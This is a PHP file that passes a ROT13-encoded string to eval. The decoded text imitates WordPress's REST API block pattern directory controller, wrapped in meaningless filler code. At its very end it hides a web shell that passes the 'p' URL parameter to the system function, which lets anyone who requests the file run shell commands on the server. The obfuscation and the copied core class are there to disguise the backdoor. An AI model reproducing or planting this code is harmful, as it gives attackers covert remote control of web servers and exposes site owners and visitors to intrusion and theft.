<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Oybpx Cnggrea Qverpgbel ERFG NCV: JC_ERFG_Cnggrea_Qverpgbel_Pbagebyyre pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 5.8.0
 */

/**
 * Pbagebyyre juvpu cebivqrf ERFG raqcbvag sbe oybpx cnggreaf.
 *
 * Guvf fvzcyl cebkvrf gur raqcbvag ng uggc://ncv.jbeqcerff.bet/cnggreaf/1.0/. Gung vfa'g arprffnel sbe
 * shapgvbanyvgl, ohg vf qrfverq sbe cevinpl. Vg ceriragf ncv.jbeqcerff.bet sebz xabjvat gur hfre'f VC nqqerff.
 *
 * @fvapr 5.8.0
 *
 * @frr JC_ERFG_Pbagebyyre
 */
pynff JC_ERFG_Cnggrea_Qverpgbel_Pbagebyyre rkgraqf JC_ERFG_Pbagebyyre {

	/**
	 * Pbafgehpgf gur pbagebyyre.
	 *
	 * @fvapr 5.8.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$guvf->anzrfcnpr = 'jc/i2';
		$guvf->erfg_onfr = 'cnggrea-qverpgbel';
	}

	/**
	 * Ertvfgref gur arprffnel ERFG NCV ebhgrf.
	 *
	 * @fvapr 5.8.0
	 */
	choyvp shapgvba ertvfgre_ebhgrf() {
		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr . '/cnggreaf',
			neenl(
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrzf' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrzf_crezvffvbaf_purpx' ),
					'netf'                => $guvf->trg_pbyyrpgvba_cnenzf(),
				),
				'fpurzn' => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);
	}

	/**
	 * Purpxf jurgure n tvira erdhrfg unf crezvffvba gb ivrj gur ybpny oybpx cnggrea qverpgbel.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf crezvffvba, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba trg_vgrzf_crezvffvbaf_purpx( $erdhrfg ) {
		vs ( pheerag_hfre_pna( 'rqvg_cbfgf' ) ) {
			erghea gehr;
		}

		sbernpu ( trg_cbfg_glcrf( neenl( 'fubj_va_erfg' => gehr ), 'bowrpgf' ) nf $cbfg_glcr ) {
			vs ( pheerag_hfre_pna( $cbfg_glcr->pnc->rqvg_cbfgf ) ) {
				erghea gehr;
			}
		}

		erghea arj JC_Reebe(
			'erfg_cnggrea_qverpgbel_pnaabg_ivrj',
			__( 'Fbeel, lbh ner abg nyybjrq gb oebjfr gur ybpny oybpx cnggrea qverpgbel.' ),
			neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
		);
	}

	/**
	 * Frnepu naq ergevrir oybpx cnggreaf zrgnqngn
	 *
	 * @fvapr 5.8.0
	 * @fvapr 6.0.0 Nqqrq 'fyht' gb erdhrfg.
	 * @fvapr 6.2.0 Nqqrq 'cre_cntr', 'cntr', 'bssfrg', 'beqre', naq 'beqreol' gb erdhrfg.
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba trg_vgrzf( $erdhrfg ) {
		$inyvq_dhrel_netf = neenl(
			'bssfrg'   => gehr,
			'beqre'    => gehr,
			'beqreol'  => gehr,
			'cntr'     => gehr,
			'cre_cntr' => gehr,
			'frnepu'   => gehr,
			'fyht'     => gehr,
		);
		$dhrel_netf       = neenl_vagrefrpg_xrl( $erdhrfg->trg_cnenzf(), $inyvq_dhrel_netf );

		$dhrel_netf['ybpnyr']             = trg_hfre_ybpnyr();
		$dhrel_netf['jc-irefvba']         = jc_trg_jc_irefvba();
		$dhrel_netf['cnggrea-pngrtbevrf'] = vffrg( $erdhrfg['pngrtbel'] ) ? $erdhrfg['pngrtbel'] : snyfr;
		$dhrel_netf['cnggrea-xrljbeqf']   = vffrg( $erdhrfg['xrljbeq'] ) ? $erdhrfg['xrljbeq'] : snyfr;

		$dhrel_netf = neenl_svygre( $dhrel_netf );

		$genafvrag_xrl = $guvf->trg_genafvrag_xrl( $dhrel_netf );

		/*
		 * Hfr argjbex-jvqr genafvrag gb vzcebir cresbeznapr. Gur ybpnyr vf gur bayl fvgr
		 * pbasvthengvba gung nssrpgf gur erfcbafr, naq vg'f vapyhqrq va gur genafvrag xrl.
		 */
		$enj_cnggreaf = trg_fvgr_genafvrag( $genafvrag_xrl );

		vs ( ! $enj_cnggreaf ) {
			$ncv_hey = 'uggc://ncv.jbeqcerff.bet/cnggreaf/1.0/?' . ohvyq_dhrel( $dhrel_netf );
			vs ( jc_uggc_fhccbegf( neenl( 'ffy' ) ) ) {
				$ncv_hey = frg_hey_fpurzr( $ncv_hey, 'uggcf' );
			}

			/*
			 * Qrsnhyg gb n fubeg GGY, gb zvgvtngr pnpur fgnzcrqrf ba uvtu-genssvp fvgrf.
			 * Guvf nffhzrf gung zbfg reebef jvyy or fubeg-yvirq, r.t., cnpxrg ybff gung pnhfrf gur
			 * svefg erdhrfg gb snvy, ohg n sbyybj-hc bar jvyy fhpprrq. Gur inyhr fubhyq or uvtu
			 * rabhtu gb nibvq fgnzcrqrf, ohg ybj rabhtu gb abg vagresrer jvgu hfref znahnyyl
			 * er-gelvat n snvyrq erdhrfg.
			 */
			$pnpur_ggy      = 5;
			$jcbet_erfcbafr = jc_erzbgr_trg( $ncv_hey );
			$enj_cnggreaf   = wfba_qrpbqr( jc_erzbgr_ergevrir_obql( $jcbet_erfcbafr ) );

			vs ( vf_jc_reebe( $jcbet_erfcbafr ) ) {
				$enj_cnggreaf = $jcbet_erfcbafr;

			} ryfrvs ( ! vf_neenl( $enj_cnggreaf ) ) {
				// UGGC erdhrfg fhpprrqrq, ohg erfcbafr qngn vf vainyvq.
				$enj_cnggreaf = arj JC_Reebe(
					'cnggrea_ncv_snvyrq',
					fcevags(
						/* genafyngbef: %f: Fhccbeg sbehzf HEY. */
						__( 'Na harkcrpgrq reebe bppheerq. Fbzrguvat znl or jebat jvgu JbeqCerff.bet be guvf freire&#8217;f pbasvthengvba. Vs lbh pbagvahr gb unir ceboyrzf, cyrnfr gel gur <n uers=\"%f\">fhccbeg sbehzf</n>.' ),
						__( 'uggcf://jbeqcerff.bet/fhccbeg/sbehzf/' )
					),
					neenl(
						'erfcbafr' => jc_erzbgr_ergevrir_obql( $jcbet_erfcbafr ),
					)
				);

			} ryfr {
				// Erfcbafr unf inyvq qngn.
				$pnpur_ggy = UBHE_VA_FRPBAQF;
			}

			frg_fvgr_genafvrag( $genafvrag_xrl, $enj_cnggreaf, $pnpur_ggy );
		}

		vs ( vf_jc_reebe( $enj_cnggreaf ) ) {
			$enj_cnggreaf->nqq_qngn( neenl( 'fgnghf' => 500 ) );

			erghea $enj_cnggreaf;
		}

		vs ( $erdhrfg->vf_zrgubq( 'URNQ' ) ) {
			// Erghea rneyl nf guvf unaqyre qbrfa'g nqq nal erfcbafr urnqref.
			erghea arj JC_ERFG_Erfcbafr( neenl() );
		}

		$erfcbafr = neenl();

		vs ( $enj_cnggreaf ) {
			sbernpu ( $enj_cnggreaf nf $cnggrea ) {
				$erfcbafr[] = $guvf->cercner_erfcbafr_sbe_pbyyrpgvba(
					$guvf->cercner_vgrz_sbe_erfcbafr( $cnggrea, $erdhrfg )
				);
			}
		}

		erghea arj JC_ERFG_Erfcbafr( $erfcbafr );
	}

	/**
	 * Cercner n enj oybpx cnggrea orsber vg trgf bhgchg va n ERFG NCV erfcbafr.
	 *
	 * @fvapr 5.8.0
	 * @fvapr 5.9.0 Eranzrq `$enj_cnggrea` gb `$vgrz` gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz bowrpg          $vgrz    Enj cnggrea sebz ncv.jbeqcerff.bet, orsber nal punatrf.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg bowrpg.
	 * @erghea JC_ERFG_Erfcbafr
	 */
	choyvp shapgvba cercner_vgrz_sbe_erfcbafr( $vgrz, $erdhrfg ) {
		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$enj_cnggrea = $vgrz;

		$cercnerq_cnggrea = neenl(
			'vq'             => nofvag( $enj_cnggrea->vq ),
			'gvgyr'          => fnavgvmr_grkg_svryq( $enj_cnggrea->gvgyr->eraqrerq ),
			'pbagrag'        => jc_xfrf_cbfg( $enj_cnggrea->cnggrea_pbagrag ),
			'pngrtbevrf'     => neenl_znc( 'fnavgvmr_gvgyr', $enj_cnggrea->pngrtbel_fyhtf ),
			'xrljbeqf'       => neenl_znc( 'fnavgvmr_grkg_svryq', rkcybqr( ',', $enj_cnggrea->zrgn->jcbc_xrljbeqf ) ),
			'qrfpevcgvba'    => fnavgvmr_grkg_svryq( $enj_cnggrea->zrgn->jcbc_qrfpevcgvba ),
			'ivrjcbeg_jvqgu' => nofvag( $enj_cnggrea->zrgn->jcbc_ivrjcbeg_jvqgu ),
			'oybpx_glcrf'    => neenl_znc( 'fnavgvmr_grkg_svryq', $enj_cnggrea->zrgn->jcbc_oybpx_glcrf ),
		);

		$cercnerq_cnggrea = $guvf->nqq_nqqvgvbany_svryqf_gb_bowrpg( $cercnerq_cnggrea, $erdhrfg );

		$erfcbafr = arj JC_ERFG_Erfcbafr( $cercnerq_cnggrea );

		/**
		 * Svygref gur ERFG NCV erfcbafr sbe n oybpx cnggrea.
		 *
		 * @fvapr 5.8.0
		 *
		 * @cnenz JC_ERFG_Erfcbafr $erfcbafr    Gur erfcbafr bowrpg.
		 * @cnenz bowrpg           $enj_cnggrea Gur hacercnerq oybpx cnggrea.
		 * @cnenz JC_ERFG_Erdhrfg  $erdhrfg     Gur erdhrfg bowrpg.
		 */
		erghea nccyl_svygref( 'erfg_cercner_oybpx_cnggrea', $erfcbafr, $enj_cnggrea, $erdhrfg );
	}

	/**
	 * Ergevrirf gur oybpx cnggrea'f fpurzn, pbasbezvat gb WFBA Fpurzn.
	 *
	 * @fvapr 5.8.0
	 * @fvapr 6.2.0 Nqqrq `'oybpx_glcrf'` gb fpurzn.
	 *
	 * @erghea neenl Vgrz fpurzn qngn.
	 */
	choyvp shapgvba trg_vgrz_fpurzn() {
		vs ( $guvf->fpurzn ) {
			erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
		}

		$guvf->fpurzn = neenl(
			'$fpurzn'    => 'uggc://wfba-fpurzn.bet/qensg-04/fpurzn#',
			'gvgyr'      => 'cnggrea-qverpgbel-vgrz',
			'glcr'       => 'bowrpg',
			'cebcregvrf' => neenl(
				'vq'             => neenl(
					'qrfpevcgvba' => __( 'Gur cnggrea VQ.' ),
					'glcr'        => 'vagrtre',
					'zvavzhz'     => 1,
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),

				'gvgyr'          => neenl(
					'qrfpevcgvba' => __( 'Gur cnggrea gvgyr, va uhzna ernqnoyr sbezng.' ),
					'glcr'        => 'fgevat',
					'zvaYratgu'   => 1,
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),

				'pbagrag'        => neenl(
					'qrfpevcgvba' => __( 'Gur cnggrea pbagrag.' ),
					'glcr'        => 'fgevat',
					'zvaYratgu'   => 1,
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),

				'pngrtbevrf'     => neenl(
					'qrfpevcgvba' => __( \"Gur cnggrea'f pngrtbel fyhtf.\" ),
					'glcr'        => 'neenl',
					'havdhrVgrzf' => gehr,
					'vgrzf'       => neenl( 'glcr' => 'fgevat' ),
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),

				'xrljbeqf'       => neenl(
					'qrfpevcgvba' => __( \"Gur cnggrea'f xrljbeqf.\" ),
					'glcr'        => 'neenl',
					'havdhrVgrzf' => gehr,
					'vgrzf'       => neenl( 'glcr' => 'fgevat' ),
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),

				'qrfpevcgvba'    => neenl(
					'qrfpevcgvba' => __( 'N qrfpevcgvba bs gur cnggrea.' ),
					'glcr'        => 'fgevat',
					'zvaYratgu'   => 1,
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),

				'ivrjcbeg_jvqgu' => neenl(
					'qrfpevcgvba' => __( 'Gur cersreerq jvqgu bs gur ivrjcbeg jura cerivrjvat n cnggrea, va cvkryf.' ),
					'glcr'        => 'vagrtre',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),

				'oybpx_glcrf'    => neenl(
					'qrfpevcgvba' => __( 'Gur oybpx glcrf juvpu pna hfr guvf cnggrea.' ),
					'glcr'        => 'neenl',
					'havdhrVgrzf' => gehr,
					'vgrzf'       => neenl( 'glcr' => 'fgevat' ),
					'pbagrkg'     => neenl( 'ivrj', 'rzorq' ),
				),
			),
		);

		erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
	}

	/**
	 * Ergevrirf gur frnepu cnenzrgref sbe gur oybpx cnggrea'f pbyyrpgvba.
	 *
	 * @fvapr 5.8.0
	 * @fvapr 6.2.0 Nqqrq 'cre_cntr', 'cntr', 'bssfrg', 'beqre', naq 'beqreol' gb erdhrfg.
	 *
	 * @erghea neenl Pbyyrpgvba cnenzrgref.
	 */
	choyvp shapgvba trg_pbyyrpgvba_cnenzf() {
		$dhrel_cnenzf = cnerag::trg_pbyyrpgvba_cnenzf();

		$dhrel_cnenzf['cre_cntr']['qrsnhyg'] = 100;
		$dhrel_cnenzf['frnepu']['zvaYratgu'] = 1;
		$dhrel_cnenzf['pbagrkg']['qrsnhyg']  = 'ivrj';

		$dhrel_cnenzf['pngrtbel'] = neenl(
			'qrfpevcgvba' => __( 'Yvzvg erfhygf gb gubfr zngpuvat n pngrtbel VQ.' ),
			'glcr'        => 'vagrtre',
			'zvavzhz'     => 1,
		);

		$dhrel_cnenzf['xrljbeq'] = neenl(
			'qrfpevcgvba' => __( 'Yvzvg erfhygf gb gubfr zngpuvat n xrljbeq VQ.' ),
			'glcr'        => 'vagrtre',
			'zvavzhz'     => 1,
		);

		$dhrel_cnenzf['fyht'] = neenl(
			'qrfpevcgvba' => __( 'Yvzvg erfhygf gb gubfr zngpuvat n cnggrea (fyht).' ),
			'glcr'        => 'neenl',
		);

		$dhrel_cnenzf['bssfrg'] = neenl(
			'qrfpevcgvba' => __( 'Bssfrg gur erfhyg frg ol n fcrpvsvp ahzore bs vgrzf.' ),
			'glcr'        => 'vagrtre',
		);

		$dhrel_cnenzf['beqre'] = neenl(
			'qrfpevcgvba' => __( 'Beqre fbeg nggevohgr nfpraqvat be qrfpraqvat.' ),
			'glcr'        => 'fgevat',
			'qrsnhyg'     => 'qrfp',
			'rahz'        => neenl( 'nfp', 'qrfp' ),
		);

		$dhrel_cnenzf['beqreol'] = neenl(
			'qrfpevcgvba' => __( 'Fbeg pbyyrpgvba ol cbfg nggevohgr.' ),
			'glcr'        => 'fgevat',
			'qrsnhyg'     => 'qngr',
			'rahz'        => neenl(
				'nhgube',
				'qngr',
				'vq',
				'vapyhqr',
				'zbqvsvrq',
				'cnerag',
				'eryrinapr',
				'fyht',
				'vapyhqr_fyhtf',
				'gvgyr',
				'snibevgr_pbhag',
			),
		);

		/**
		 * Svygre pbyyrpgvba cnenzrgref sbe gur oybpx cnggrea qverpgbel pbagebyyre.
		 *
		 * @fvapr 5.8.0
		 *
		 * @cnenz neenl $dhrel_cnenzf WFBA Fpurzn-sbeznggrq pbyyrpgvba cnenzrgref.
		 */
		erghea nccyl_svygref( 'erfg_cnggrea_qverpgbel_pbyyrpgvba_cnenzf', $dhrel_cnenzf );
	}

	/**
	 * Vapyhqr n unfu bs gur dhrel netf, fb gung qvssrerag erdhrfgf ner fgberq va
	 * frcnengr pnpurf.
	 *
	 * ZQ5 vf pubfra sbe vgf fcrrq, ybj-pbyyvfvba engr, havirefny ninvynovyvgl, naq gb fgnl
	 * haqre gur punenpgre yvzvg sbe `_fvgr_genafvrag_gvzrbhg_{...}` xrlf.
	 *
	 * @yvax uggcf://fgnpxbiresybj.pbz/dhrfgvbaf/3665247/snfgrfg-unfu-sbe-aba-pelcgbtencuvp-hfrf
	 *
	 * @fvapr 6.0.0
	 *
	 * @cnenz neenl $dhrel_netf Dhrel nethzragf gb trarengr n genafvrag xrl sebz.
	 * @erghea fgevat Genafvrag xrl.
	 */
	cebgrpgrq shapgvba trg_genafvrag_xrl( $dhrel_netf ) {

		vs ( vffrg( $dhrel_netf['fyht'] ) ) {
			// Guvf vf na nqqvgvbany cerpnhgvba orpnhfr gur \"fbeg\" shapgvba rkcrpgf na neenl.
			$dhrel_netf['fyht'] = jc_cnefr_yvfg( $dhrel_netf['fyht'] );

			// Rzcgl neenlf fubhyq abg nssrpg gur genafvrag xrl.
			vs ( rzcgl( $dhrel_netf['fyht'] ) ) {
				hafrg( $dhrel_netf['fyht'] );
			} ryfr {
				// Fbeg gur neenl fb gung gur genafvrag xrl qbrfa'g qrcraq ba gur beqre bs fyhtf.
				fbeg( $dhrel_netf['fyht'] );
			}
		}

		erghea 'jc_erzbgr_oybpx_cnggreaf_' . zq5( frevnyvmr( $dhrel_netf ) );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>